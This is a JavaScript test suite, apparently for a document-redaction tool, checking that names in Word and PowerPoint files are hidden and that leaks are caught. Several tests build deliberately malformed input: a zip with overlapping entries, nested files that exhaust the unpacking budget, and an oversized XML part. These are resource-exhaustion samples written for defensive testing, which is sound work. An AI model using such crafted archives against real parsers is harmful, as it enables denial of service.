  const rels = await part(res.bytes, "word/_rels/document.xml.rels");
  assert.doesNotMatch(rels, /Dalton|Rachel|Kim/);
  // The gate decodes %20 too: a value only the gate can see is reported, not shipped.
  const leaks = O.findLeaks([{ name: "word/_rels/document.xml.rels", data: new TextEncoder().encode('<Relationship Target="https://x.example/Best%20Byte/"/>') }], ["Best Byte"]);
  assert.equal(leaks.length, 1);
});

test("a field code split across runs: the gate reads it joined", () => {
  const xml = '<w:p><w:r><w:instrText>INCLUDETEXT "C:\\Clients\\Dalton Comp</w:instrText></w:r><w:r><w:instrText>uters\\notes.docx"</w:instrText></w:r></w:p>';
  assert.equal(O.findLeaks([{ name: "word/document.xml", data: new TextEncoder().encode(xml) }], ["Dalton Computers"]).length, 1);
});

test("an Office file stored outside the embeddings folder, a UTF-16 part, or a stray macro part stops the save", async () => {
  const docx = fixture("doc.docx");
  const entries = await O.readZip(docx);
  const withChunk = await O.writeZip([...entries, { name: "word/afchunk.docx", data: docx }]);
  assert.ok((await O.open(withChunk)).summary.blockers.some((b) => b.part === "word/afchunk.docx"));
  const utf16 = new Uint8Array([0xff, 0xfe, ...[...new TextEncoder().encode("<x/>")].flatMap((b) => [b, 0])]);
  const withUtf16 = await O.writeZip([...entries, { name: "customXml/item9.xml", data: utf16 }]);
  assert.ok((await O.open(withUtf16)).summary.blockers.some((b) => b.part === "customXml/item9.xml"));
  const withVba = await O.writeZip([...entries, { name: "word/vbaProjectNotes.txt", data: new TextEncoder().encode("Rachel Kim") }]);
  assert.ok((await O.open(withVba)).summary.blockers.some((b) => b.part === "word/vbaProjectNotes.txt" && b.why === "macros"));
});

test("an accented name stored decomposed in a Word file is redacted", async () => {
  const bytes = await edited("doc.docx", "word/document.xml", (x) => x.replace("Rachel Kim approved the ", "José Núñez approved the ".normalize("NFD")));
  const res = await O.redactPackage(await O.open(bytes), { ...OPTS, lists: { ...LISTS, PERSON: `${LISTS.PERSON}\nJosé Núñez` } }, new R.Session(), { pictures: "gray", identity: true });
  assert.deepEqual([...res.report.leaks], []);
  assert.doesNotMatch((await part(res.bytes, "word/document.xml")).normalize("NFC"), /José|Núñez/);
});

test("the gate compares a value typed with a curly apostrophe to text with a straight one", () => {
  const xml = (t) => [{ name: "word/document.xml", data: new TextEncoder().encode(`<w:t>${t}</w:t>`) }];
  assert.equal(O.findLeaks(xml("O'Neil Smith signed"), ["O\u2019Neil Smith"]).length, 1);
});

test("a field code split across runs is redacted joined, and HyperlinkBase is redacted like a link", async () => {
  const bytes = await edited("doc.docx", "word/document.xml", (x) =>
    x.replace(/<w:t[^>]*>Rachel Kim approved the <\/w:t>/, '<w:instrText>INCLUDETEXT "C:\\\\Clients\\\\Dalton Comp</w:instrText></w:r><w:r><w:instrText>uters\\\\notes.docx"</w:instrText></w:r><w:r><w:t xml:space="preserve">x </w:t>'),
  );
  assert.match(dec.decode((await O.readZip(bytes)).find((e) => e.name === "word/document.xml").data), /Dalton Comp<\/w:instrText>/);
  const withBase = await edited("doc.docx", "docProps/app.xml", (x) => x.replace("</Properties>", "<HyperlinkBase>https://share.example/Dalton%20Computers/</HyperlinkBase></Properties>"));
  for (const b of [bytes, withBase]) {
    const res = await O.redactPackage(await O.open(b), OPTS, new R.Session(), { pictures: "gray", identity: true });
    assert.deepEqual([...res.report.leaks], []);
    for (const e of await O.readZip(res.bytes)) if (/\.xml$/.test(e.name)) assert.doesNotMatch(dec.decode(e.data).replace(/<[^>]*>/g, ""), /Dalton\s*Comp/, e.name);
  }
});

test("a zip whose entries share one file's data is refused", async () => {
  const z = new Uint8Array(await O.writeZip([{ name: "a.xml", data: new TextEncoder().encode("<a/>") }, { name: "b.xml", data: new TextEncoder().encode("<b/>") }]));
  // Point the second central-directory entry at the first entry's data.
  const dv = new DataView(z.buffer);
  const eocd = z.length - 22;
  const cd = dv.getUint32(eocd + 16, true);
  const second = cd + 46 + dv.getUint16(cd + 28, true) + dv.getUint16(cd + 30, true) + dv.getUint16(cd + 32, true);
  dv.setUint32(second + 42, dv.getUint32(cd + 42, true), true);
  await assert.rejects(O.readZip(z), /not-zip/);
});

test("files inside a file share one unpacking budget", async () => {
  const saved = O.LIMITS.totalBytes;
  try {
    const inner = await O.writeZip([...(await O.readZip(fixture("doc.docx"))), { name: "word/pad.xml", data: new TextEncoder().encode(`<p>${"x".repeat(400_000)}</p>`) }]);
    const entries = await O.readZip(fixture("doc.docx"));
    const outer = async (n) => O.writeZip([...entries, ...Array.from({ length: n }, (_, k) => ({ name: `word/embeddings/inner${k}.docx`, data: inner }))]);
    // Each file unpacks to about 1.2 MB: one fits in 3 MB, three only with a fresh budget each.
    O.LIMITS.totalBytes = 3_000_000;
    const one = await O.redactPackage(await O.open(await outer(1)), OPTS, new R.Session(), { pictures: "gray", identity: true });
    assert.ok(one.report, "one inside file fits");
    await assert.rejects(async () => O.redactPackage(await O.open(await outer(3)), OPTS, new R.Session(), { pictures: "gray", identity: true }), /too-large/);
  } finally {
    O.LIMITS.totalBytes = saved;
  }
});

test("an XML part of millions of empty tags is refused, not turned into gigabytes", () => {
  assert.throws(() => O.tokenize("<a/>".repeat(6_000_001)), /too-large/);
  assert.equal(O.tokenize("<a/>".repeat(1000)).length, 1000);
});

test("the practice deck redacts cleanly with the Dalton key opened first: the key's own names are hidden, not just found", async () => {
  const first = new R.Session();
  R.redactCsv("Account Name,Contact Name\nValuMart,Keisha Daniels\n", { lists: {} }, first, ["mask", "mask"]);
  const key = JSON.parse(JSON.stringify(first.key));
  const deck = new Uint8Array(readFileSync(join(HERE, "../../data-pack/redact-practice/kestrel-launch-plan.pptx")));
  const lists = { COMPANY: "Dalton Computers\nBest Byte\nValuMart\nHalcrest Retail Partners", PERSON: "Rachel Kim\nTessa Monroe\nTaylor Brooks\nPriya Shah", PRODUCT: "Project Kestrel | Kestrel" };
  const res = await O.redactPackage(await O.open(deck), { ...OPTS, terms: "", lists }, new R.Session(key), { pictures: "gray", identity: true });
  assert.deepEqual([...res.report.leaks], []);
  assert.ok(res.bytes);
  assert.ok(res.text.includes(key.entries.find((e) => e.value === "Keisha Daniels").placeholder));
  assert.ok(!res.text.includes("Keisha"));
});
